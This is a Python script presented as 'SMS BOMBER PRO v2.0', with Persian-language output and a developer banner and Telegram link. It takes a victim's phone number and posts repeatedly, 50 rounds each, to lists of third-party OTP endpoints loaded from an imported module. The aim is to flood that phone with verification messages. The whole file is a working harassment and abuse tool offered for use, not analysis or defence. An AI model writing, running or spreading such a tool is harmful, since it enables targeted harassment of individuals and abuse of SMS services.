#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from api import send_otp_requests, send_otp_requests_json
import requests
import pyfiglet
from colorama import Fore, init, Style
import time
import os
import sys

init(autoreset=True)

# Clear screen
os.system('clear' if os.name == 'posix' else 'cls')

# Header
print(Fore.RED + "█" * 60)
print(Fore.RED + "█" + Fore.YELLOW + " " * 58 + Fore.RED + "█")
print(Fore.RED + "█" + Fore.YELLOW + "    🔥 SMS BOMBER PRO v2.0 🔥" + " " * 28 + Fore.RED + "█")
print(Fore.RED + "█" + Fore.YELLOW + " " * 58 + Fore.RED + "█")
print(Fore.RED + "█" * 60)

# Big Logo with Mr_Linux
logo = pyfiglet.figlet_format("Mr_Linux", font="big")
print(Fore.CYAN + logo)

# Banner
print(Fore.MAGENTA + "╔════════════════════════════════════════════════════════╗")
print(Fore.MAGENTA + "║" + Fore.WHITE + "  👨‍💻 Developer  : " + Fore.RED + "Mr_Linux" + " " * 30 + Fore.MAGENTA + "║")
print(Fore.MAGENTA + "║" + Fore.WHITE + "  📱 Telegram   : " + Fore.BLUE + "https://t.me/Mr_Linuxxt" + " " * 16 + Fore.MAGENTA + "║")
print(Fore.MAGENTA + "║" + Fore.WHITE + "  📅 Version    : " + Fore.GREEN + "2.0 - 2025" + " " * 32 + Fore.MAGENTA + "║")
print(Fore.MAGENTA + "║" + Fore.WHITE + "  ⚡ Status     : " + Fore.GREEN + "Online ✅" + " " * 35 + Fore.MAGENTA + "║")
print(Fore.MAGENTA + "╚════════════════════════════════════════════════════════╝")

print(Fore.WHITE + "\n┌─────────────────────────────────────────────────────────┐")
print(Fore.WHITE + "│" + Fore.YELLOW + "  🌟 SELECT SERVER 🌟" + " " * 42 + Fore.WHITE + "│")
print(Fore.WHITE + "├─────────────────────────────────────────────────────────┤")
print(Fore.WHITE + "│" + Fore.RED + "  [1]" + Fore.WHITE + "  Server One  " + Fore.LIGHTBLACK_EX + "(Form Data)" + " " * 34 + Fore.WHITE + "│")
print(Fore.WHITE + "│" + Fore.RED + "  [2]" + Fore.WHITE + "  Server Two  " + Fore.LIGHTBLACK_EX + "(JSON Data)" + " " * 34 + Fore.WHITE + "│")
print(Fore.WHITE + "└─────────────────────────────────────────────────────────┘")

try:
    servers = int(input(Fore.GREEN + "\n┌─[ " + Fore.CYAN + "INPUT" + Fore.GREEN + " ]\n└──> " + Fore.YELLOW))
    
    if servers == 1:
        number = str(input(Fore.GREEN + "\n┌─[ " + Fore.CYAN + "PHONE" + Fore.GREEN + " ]\n└──> " + Fore.YELLOW))
        
        # Validation
        if not number.isdigit() or len(number) != 10:
            print(Fore.RED + "\n[!] شماره وارد شده معتبر نیست! (باید 10 رقم باشد)")
            sys.exit(1)
        
        print(Fore.CYAN + "\n" + "═" * 60)
        print(Fore.CYAN + "  ⏳ شروع ارسال به شماره " + Fore.RED + number + Fore.CYAN + " ...")
        print(Fore.CYAN + "═" * 60 + "\n")
        
        apis = send_otp_requests(number)
        total_apis = len(apis)
        print(Fore.LIGHTBLACK_EX + f"  📡 تعداد API‌ها: {total_apis}")
        print(Fore.LIGHTBLACK_EX + f"  🔄 تعداد دورها: 50")
        print(Fore.LIGHTBLACK_EX + f"  📊 مجموع تلاش‌ها: {total_apis * 50}\n")
        
        success_count = 0
        fail_count = 0
        
        for i in range(50):
            round_success = 0
            print(Fore.YELLOW + f"\n  ┌─[ دور {i+1}/50 ]─" + "─" * 40)
            
            for url, payload in apis:
                try:
                    response = requests.post(url, data=payload, timeout=5)
                    if response.status_code in [200, 201, 202]:
                        round_success += 1
                        success_count += 1
                        print(Fore.GREEN + f"  ✓ " + Fore.WHITE + number + Fore.GREEN + " ارسال شد " + Fore.LIGHTBLACK_EX + f"({url.split('/')[2]})")
                    else:
                        fail_count += 1
                except requests.exceptions.RequestException:
                    fail_count += 1
                    pass
            
            print(Fore.YELLOW + f"  └─[ ✅ {round_success} موفق | ❌ {len(apis) - round_success} ناموفق ]")
            time.sleep(0.1)
        
        # Final Stats
        print(Fore.CYAN + "\n" + "═" * 60)
        print(Fore.GREEN + "  ✅ عملیات با موفقیت به پایان رسید!")
        print(Fore.WHITE + f"  📊 آمار نهایی:")
        print(Fore.GREEN + f"    ✓ موفق: {success_count}")
        print(Fore.RED + f"    ✗ ناموفق: {fail_count}")
        print(Fore.CYAN + "═" * 60 + "\n")
        
    elif servers == 2:
        number = str(input(Fore.GREEN + "\n┌─[ " + Fore.CYAN + "PHONE" + Fore.GREEN + " ]\n└──> " + Fore.YELLOW))
        
        if not number.isdigit() or len(number) != 10:
            print(Fore.RED + "\n[!] شماره وارد شده معتبر نیست! (باید 10 رقم باشد)")
            sys.exit(1)
        
        print(Fore.CYAN + "\n" + "═" * 60)
        print(Fore.CYAN + "  ⏳ شروع ارسال به شماره " + Fore.RED + number + Fore.CYAN + " ...")
        print(Fore.CYAN + "═" * 60 + "\n")
        
        apis2 = send_otp_requests_json(number)
        total_apis = len(apis2)
        print(Fore.LIGHTBLACK_EX + f"  📡 تعداد API‌ها: {total_apis}")
        print(Fore.LIGHTBLACK_EX + f"  🔄 تعداد دورها: 50")
        print(Fore.LIGHTBLACK_EX + f"  📊 مجموع تلاش‌ها: {total_apis * 50}\n")
        
        success_count = 0
        fail_count = 0
        
        for i in range(50):
            round_success = 0
            print(Fore.YELLOW + f"\n  ┌─[ دور {i+1}/50 ]─" + "─" * 40)
            
            for url2, payload2 in apis2:
                try:
                    response2 = requests.post(url2, json=payload2, timeout=5)
                    if response2.status_code in [200, 201, 202]:
                        round_success += 1
                        success_count += 1
                        print(Fore.GREEN + f"  ✓ " + Fore.WHITE + number + Fore.GREEN + " ارسال شد " + Fore.LIGHTBLACK_EX + f"({url2.split('/')[2]})")
                    else:
                        fail_count += 1
                except requests.exceptions.RequestException:
                    fail_count += 1
                    pass
            
            print(Fore.YELLOW + f"  └─[ ✅ {round_success} موفق | ❌ {len(apis2) - round_success} ناموفق ]")
            time.sleep(0.1)
        
        print(Fore.CYAN + "\n" + "═" * 60)
        print(Fore.GREEN + "  ✅ عملیات با موفقیت به پایان رسید!")
        print(Fore.WHITE + f"  📊 آمار نهایی:")
        print(Fore.GREEN + f"    ✓ موفق: {success_count}")
        print(Fore.RED + f"    ✗ ناموفق: {fail_count}")
        print(Fore.CYAN + "═" * 60 + "\n")
        
    else:
        print(Fore.RED + "\n[!] شماره سرور نامعتبر!")
        
except KeyboardInterrupt:
    print(Fore.RED + "\n\n  [!] خداحافظ!")
    print(Fore.CYAN + "  📱 تلگرام: https://t.me/Mr_Linuxxt")
    print(Fore.LIGHTBLACK_EX + "  👨‍💻 توسعه‌دهنده: Mr_Linux\n")
    sys.exit(0)
except ValueError:
    print(Fore.RED + "\n[!] لطفاً عدد وارد کنید!")
